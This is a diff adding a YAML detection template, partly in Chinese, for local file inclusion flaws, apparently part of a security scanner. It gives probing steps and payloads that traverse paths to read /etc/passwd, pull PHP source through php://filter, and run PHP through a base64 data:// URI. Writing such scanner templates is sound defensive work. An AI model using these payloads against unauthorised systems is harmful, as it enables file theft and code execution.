@@ -1,0 +1,14 @@
+type: LFI
+name: 本地文件包含
+description: 文件包含参数未过滤，可读取任意文件或 RCE
+need_detect: 目标存在文件包含参数（file/page/include/path 等）
+prompt: |
+  LFI 检测：
+  1. 用 ../../../../etc/passwd 探测路径穿越
+  2. 用 php://filter 读取源码（base64 编码）
+  3. 尝试日志包含/伪协议（php://input, data://）
+payloads:
+  - "../../../../etc/passwd"
+  - "php://filter/convert.base64-encode/resource=index.php"
+  - "/etc/passwd"
+  - "data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4="
